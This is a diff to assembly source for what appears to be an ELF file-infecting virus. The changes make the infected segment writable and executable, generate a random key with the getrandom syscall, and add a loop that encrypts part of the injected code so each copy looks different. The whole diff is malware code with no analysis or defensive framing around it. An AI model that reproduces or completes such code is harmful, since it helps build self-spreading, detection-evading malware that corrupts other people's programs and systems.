@@ -163,7 +163,35 @@ copy_program:
     add qword [r13 + p_filesz], PROG_SIZE
     
     or dword [r13 + p_flags], PF_X           ; ajoute les droit d'execution
-    
+    or dword [r13 + p_flags], PF_W           ; ajoute les droit d'execution
+
+change_key:
+    lea rdi, [rbx + KEY_OFFSET]
+    mov rsi, KEY_SIZE
+    mov rdx, GRND_RANDOM
+    mov rax, SYS_GETRANDOM
+    syscall
+
+encrypt:
+    lea rdi, [rbx + ENCRYPT_OFFSET]
+    lea rsi, [rbx + KEY_OFFSET]
+	xor rax, rax
+	xor rcx, rcx
+	mov bl,  [rsi + rcx]
+	add [rdi + rax], bl
+	encrypt_loop:
+	inc rcx
+	cmp rcx, KEY_SIZE
+	jnz encrypt_nochange
+	xor rcx, rcx
+	encrypt_nochange:
+	mov bl,  [rsi + rcx]
+	add bl,  [rdi + rax]
+	inc rax
+	add [rdi + rax], bl
+	cmp rax, ENCRYPT_SIZE
+	jnz encrypt_loop
+
 close_mmap:
     mov rdi, [r12 + fileData]
     mov rsi, [r12 + fileSize]
